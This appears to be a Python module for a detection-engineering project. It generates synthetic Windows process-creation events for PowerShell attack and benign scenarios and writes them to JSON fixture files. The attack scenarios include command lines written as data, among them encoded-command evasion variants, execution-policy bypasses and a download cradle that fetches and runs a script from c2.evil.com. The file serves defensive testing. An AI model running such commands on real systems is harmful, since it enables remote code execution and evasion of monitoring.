"""
Synthetic Telemetry Generator
Generates realistic Windows Process Creation (Sysmon Event 1 / Event 4688) events for attack and benign scenarios.
"""
import json
from pathlib import Path
from typing import List, Dict, Tuple
from backend.models import AttackScenario, TelemetryEvent
from backend.config import settings

def get_predefined_scenarios() -> Tuple[List[AttackScenario], List[AttackScenario]]:
    """Returns lists of predefined (attack_scenarios, benign_scenarios)."""
    attacks = [
        AttackScenario(
            scenario_id="ATK-001",
            name="Standard PowerShell Encoded Command",
            description="PowerShell process launched with standard -EncodedCommand flag.",
            expected_behavior="Executes base64 encoded PowerShell script block.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
            expected_detection_original=True,
            category="attack"
        ),
        AttackScenario(
            scenario_id="ATK-002",
            name="PowerShell Abbreviated Encoded Flag (-enc)",
            description="PowerShell execution utilizing PowerShell's parameter abbreviation (-enc).",
            expected_behavior="Executes base64 encoded payload bypassing exact string match for EncodedCommand.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
            expected_detection_original=False,
            category="attack"
        ),
        AttackScenario(
            scenario_id="ATK-003",
            name="PowerShell Minimal Abbreviated Flag (-e)",
            description="PowerShell execution using single letter parameter abbreviation (-e).",
            expected_behavior="Executes base64 payload via minimal flag.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
            expected_detection_original=False,
            category="attack"
        ),
        AttackScenario(
            scenario_id="ATK-004",
            name="PowerShell Core (pwsh.exe) Execution",
            description="Modern cross-platform PowerShell Core binary used for encoded command execution.",
            expected_behavior="Malicious payload executed inside pwsh.exe instead of powershell.exe.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            process_fields={"Image": r"C:\Program Files\PowerShell\7\pwsh.exe", "CommandLine": "pwsh.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
            expected_detection_original=False,
            category="attack"
        ),
        AttackScenario(
            scenario_id="ATK-005",
            name="Suspicious Parent Process Invocation",
            description="PowerShell spawned by cmd.exe with hidden window and bypass policy.",
            expected_behavior="Secondary payload launcher spawned from legacy command prompt.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Defense Evasion",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Host 'Beaconing'", "ParentImage": r"C:\Windows\System32\cmd.exe"},
            expected_detection_original=False,
            category="attack"
        ),
        AttackScenario(
            scenario_id="ATK-006",
            name="PowerShell Download Cradle (IEX / WebClient)",
            description="In-memory download cradle invoking remote malicious script.",
            expected_behavior="Downloads and executes remote stage payload without EncodedCommand.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.com/payload.ps1')\""},
            expected_detection_original=False,
            category="attack"
        ),
        AttackScenario(
            scenario_id="ATK-007",
            name="Windows Slash Notation Flag (/enc)",
            description="PowerShell CLI accepting Windows slash-style command arguments.",
            expected_behavior="Slash parameter delimiter used instead of hyphen.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Defense Evasion",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe /enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
            expected_detection_original=False,
            category="attack"
        ),
        AttackScenario(
            scenario_id="ATK-008",
            name="Unrestricted Execution Policy Script Launch",
            description="PowerShell executing unauthorized script with execution policy bypass.",
            expected_behavior="Executes unapproved script directly from disk.",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": r"powershell.exe -ep bypass -File C:\Users\Public\loader.ps1"},
            expected_detection_original=False,
            category="attack"
        ),
    ]

    benign = [
        AttackScenario(
            scenario_id="BEN-001",
            name="Standard Administrative Diagnostics",
            description="Routine IT administrator system check.",
            expected_behavior="Queries system parameters using Get-ComputerInfo.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -Command Get-ComputerInfo"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-002",
            name="Scheduled System Maintenance Backup",
            description="Windows Task Scheduler automated maintenance job.",
            expected_behavior="Runs signed corporate backup script.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": r"powershell.exe -NoProfile -NonInteractive -File C:\ProgramData\EnterpriseBackup\backup.ps1", "ParentImage": r"C:\Windows\System32\taskhostw.exe"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-003",
            name="Enterprise Software Installer Wrapper",
            description="Software installer invoking configuration script.",
            expected_behavior="MsiExec helper executing deployment logic.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": r"powershell.exe -ExecutionPolicy Restricted -File C:\Windows\Installer\install_agent.ps1", "ParentImage": r"C:\Windows\System32\msiexec.exe"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-004",
            name="Active Directory User Query",
            description="Admin retrieving user account directory properties.",
            expected_behavior="Runs Get-ADUser cmdlet.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -Command \"Get-ADUser -Filter * -Properties DisplayName\""},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-005",
            name="VS Code Integrated Terminal Launch",
            description="Developer launching developer shell in VS Code.",
            expected_behavior="Normal developer interactive CLI session.",
            mitre_technique_id="",
            mitre_tactic="Benign Development",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": r"powershell.exe -NoExit", "ParentImage": r"C:\Users\Developer\AppData\Local\Programs\Microsoft VS Code\Code.exe"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-006",
            name="Network Connection Diagnostic",
            description="Admin testing reachability of domain controller.",
            expected_behavior="Runs Test-NetConnection diagnostic.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -Command Test-NetConnection -ComputerName dc01.internal -Port 389"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-007",
            name="Windows Defender Health Status Check",
            description="SOC analyst checking endpoint antivirus status.",
            expected_behavior="Queries antivirus signatures via Get-MpComputerStatus.",
            mitre_technique_id="",
            mitre_tactic="Benign Security",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -Command Get-MpComputerStatus"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-008",
            name="Disk Space Maintenance Cleanup",
            description="Automated storage cleanup routine.",
            expected_behavior="Cleans temporary files.",
            mitre_technique_id="",
            mitre_tactic="Benign Maintenance",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": r"powershell.exe -File C:\Windows\System32\cleanmgr.ps1"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-009",
            name="PowerShell Cmdlet Help Documentation",
            description="User viewing cmdlet documentation in console.",
            expected_behavior="Executes Get-Help cmdlet.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -Command Get-Help Get-Service -Detailed"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-010",
            name="Microsoft SCCM Client Task Invocation",
            description="Systems management client applying patch configuration.",
            expected_behavior="Executes configuration compliance script.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": r"powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemHealthAgent.ps1", "ParentImage": r"C:\Windows\CCM\CcmExec.exe"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-011",
            name="Azure PowerShell Management Module",
            description="Cloud administrator connecting to Azure tenant.",
            expected_behavior="Runs Connect-AzAccount module command.",
            mitre_technique_id="",
            mitre_tactic="Benign Administration",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -Command Import-Module Az.Accounts; Connect-AzAccount -Identity"},
            expected_detection_original=False,
            category="benign"
        ),
        AttackScenario(
            scenario_id="BEN-012",
            name="Windows Terminal Default Shell Startup",
            description="Interactive terminal window opened by user.",
            expected_behavior="WindowsTerminal.exe spawns interactive powershell shell.",
            mitre_technique_id="",
            mitre_tactic="Benign Interactive",
            process_fields={"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe", "ParentImage": r"C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18\WindowsTerminal.exe"},
            expected_detection_original=False,
            category="benign"
        ),
    ]

    return attacks, benign

def generate_telemetry_for_scenarios() -> Tuple[List[TelemetryEvent], List[TelemetryEvent]]:
    """Generates synthetic TelemetryEvent instances for all scenarios."""
    attacks, benign = get_predefined_scenarios()
    attack_events = []
    benign_events = []

    for idx, sc in enumerate(attacks, start=1):
        evt = TelemetryEvent(
            event_id=f"EVT-ATK-{idx:03d}",
            timestamp=f"2026-01-15T14:{idx:02d}:00Z",
            computer="WIN-SRV-CORP-01",
            image=sc.process_fields.get("Image", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            command_line=sc.process_fields.get("CommandLine", ""),
            parent_image=sc.process_fields.get("ParentImage", r"C:\Windows\explorer.exe"),
            parent_command_line=r"C:\Windows\explorer.exe",
            user="CORP\\Administrator",
            process_id=4000 + idx,
            parent_process_id=1200,
            original_file_name="PowerShell.Exe" if "powershell" in sc.process_fields.get("Image", "").lower() else "pwsh.dll",
            current_directory=r"C:\Users\Administrator",
            hashes={"SHA256": f"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b85{idx}"},
            is_attack=True,
            scenario_id=sc.scenario_id,
            source="synthetic",
            raw_event={"Scenario": sc.name, "CommandLine": sc.process_fields.get("CommandLine", "")}
        )
        attack_events.append(evt)

    for idx, sc in enumerate(benign, start=1):
        evt = TelemetryEvent(
            event_id=f"EVT-BEN-{idx:03d}",
            timestamp=f"2026-01-15T09:{idx:02d}:00Z",
            computer="WIN-SRV-CORP-01",
            image=sc.process_fields.get("Image", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            command_line=sc.process_fields.get("CommandLine", ""),
            parent_image=sc.process_fields.get("ParentImage", r"C:\Windows\System32\services.exe"),
            parent_command_line=r"C:\Windows\System32\services.exe",
            user="NT AUTHORITY\\SYSTEM" if idx % 2 == 0 else "CORP\\ItAdmin",
            process_id=6000 + idx,
            parent_process_id=800,
            original_file_name="PowerShell.Exe",
            current_directory=r"C:\Windows\System32",
            hashes={"SHA256": f"1111c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b85{idx}"},
            is_attack=False,
            scenario_id=sc.scenario_id,
            source="synthetic",
            raw_event={"Scenario": sc.name, "CommandLine": sc.process_fields.get("CommandLine", "")}
        )
        benign_events.append(evt)

    return attack_events, benign_events

def persist_default_fixtures() -> None:
    """Writes default scenario and telemetry files to data/ directories."""
    attacks, benign = get_predefined_scenarios()
    all_scenarios = attacks + benign
    scenarios_path = settings.ATTACK_SCENARIOS_DIR / "scenarios.json"
    scenarios_path.write_text(json.dumps([s.model_dump() for s in all_scenarios], indent=2), encoding="utf-8")

    atk_events, ben_events = generate_telemetry_for_scenarios()
    
    atk_path = settings.ATTACK_TELEMETRY_DIR / "synthetic_attacks.jsonl"
    with open(atk_path, "w", encoding="utf-8") as f:
        for ev in atk_events:
            f.write(json.dumps(ev.model_dump()) + "\n")

    ben_path = settings.BENIGN_TELEMETRY_DIR / "synthetic_benign.jsonl"
    with open(ben_path, "w", encoding="utf-8") as f:
        for ev in ben_events:
            f.write(json.dumps(ev.model_dump()) + "\n")
